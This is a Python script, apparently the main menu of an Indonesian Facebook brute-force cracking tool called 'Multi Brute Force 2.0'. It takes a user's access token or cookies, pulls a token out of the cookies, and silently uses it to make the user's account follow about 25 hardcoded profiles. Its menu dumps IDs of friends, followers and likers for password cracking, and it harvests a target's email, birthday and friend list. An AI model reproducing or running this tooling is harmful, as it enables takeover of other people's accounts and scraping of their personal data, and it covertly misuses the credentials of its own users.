#!/usr/bin/python3
#-*-coding:utf-8-*-
# Created By Dapunta
# Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
# GOKIL LU BRO BISA JEBOLIN FILENYA!!
# JANGAN GANTI BOT FOLLOWERNYA YA!! KALAU MAU NAMBAH BOLEH.

import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
import crack,public,follow,likers,random_numbers,random_email
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

try:
	import mechanize
except ImportError:
	os.system("pip install mechanize")
try:
	import requests
except ImportError:
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	os.system("pip install bs4")
	os.system("python premium.py")

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"3"+k+"]"+p+" Update Script"))
  print((k+"["+p+"4"+k+"]"+p+" Report Bug"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="4":
    wangsaff()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
        
def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
	requests.post('https://graph.facebook.com/100001434048896/subscribers?access_token=' + toket) #Ishak Ibrahim
	requests.post('https://graph.facebook.com/100003467793035/subscribers?access_token=' + toket) #Fajar Dwi Setyawan
	requests.post('https://graph.facebook.com/100000177285475/subscribers?access_token=' + toket) #Fajar Maulana
	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         #Raifan KKR
	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
	requests.post('https://graph.facebook.com/100060562954794/subscribers?access_token=' + toket) #Raifan Khaidir 1988
	requests.post('https://graph.facebook.com/20703665/subscribers?access_token=' + toket)        #Muhamad Yusuf Riyansyah
	requests.post('https://graph.facebook.com/100002212969197/subscribers?access_token=' + toket) #Agung Permana
	requests.post('https://graph.facebook.com/100027877054892/subscribers?access_token=' + toket) #Febi Takayana
	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Moch Faskhal
	menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
    print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
    print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status  : "+h+"Premium"+p))
    print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
    print((k+"\n["+p+"1"+k+"]"+p+" Dump ID From Public/Friend"))
    print((k+"["+p+"2"+k+"]"+p+" Dump ID From Followers"))
    print((k+"["+p+"3"+k+"]"+p+" Dump ID From Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" Dump ID By Name"))
    print((k+"["+p+"5"+k+"]"+p+" Start Crack"))
    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
    print((k+"["+p+"7"+k+"]"+p+" Crack By Phone Number"))
    print((k+"["+p+"8"+k+"]"+p+" Crack By Email"))
    print((k+"["+p+"9"+k+"]"+p+" Result Crack"))
    print((k+"["+p+"0"+k+"]"+p+" Logout"))
    choose_menu()
	
def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1":
		exit(public.public())
	elif r=="2":
		exit(follow.follow())
	elif r=="3":
		exit(likers.likers())
	elif r=="4":
		search_name()
	elif r=="5":
		exit(crack.pilihcrack())
	elif r=="6":
		target()
	elif r=="7":
		exit(random_numbers.random_numbers())
	elif r=="8":
		exit(random_email.random_email())
	elif r=="9":
		ress()
	elif r=="0":
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Script")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	

def search_name():
    os.system("clear")
    banner()
    print((k+"\n["+p+"•"+k+"]"+p+" This Feature Is Not Available Right Now"))
    print((k+"["+p+"•"+k+"]"+p+" Please Wait Until Coming Soon"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

### RESULT ###

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

def updatesc():
	os.system("clear")
	banner()
	print((k+"\n["+p+"•"+k+"]"+p+" Updating Script"))
	os.system("git pull premium")
	print((k+"\n["+p+"•"+k+"]"+p+" Update Successful"))
	exit()

def wangsaff():
    os.system("clear")
    banner()
    input("\n[ Contact Dapunta? ]")
    jalan(k+"["+p+"•"+k+"]"+p+" Open Whatsapp...")
    os.system("xdg-open https://wa.me/+6282245780524?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20Premium%20Dapunta.%20Code:%20Error")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	menu()
